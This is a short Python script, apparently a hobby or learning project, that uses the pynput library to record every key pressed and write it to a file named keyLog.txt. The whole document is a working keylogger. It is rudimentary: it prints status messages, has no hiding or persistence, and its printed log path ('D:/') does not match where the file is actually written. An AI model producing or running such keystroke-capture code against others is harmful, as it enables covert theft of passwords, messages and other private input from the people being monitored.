import os
from pynput.keyboard import Key, Listener
import logging



log_dir ="D:/"
print(f"Current log path={os.path.join(log_dir,'keyLog.txt')}")
logging.basicConfig(filename ='keyLog.txt' , level=logging.INFO, format='%(message)s')
def on_press(key):
	print("LOGGING")
	logging.info(str(key))

if __name__ == "__main__":
	with Listener(on_press=on_press) as listener:
		print("Scipt Started")
		listener.join()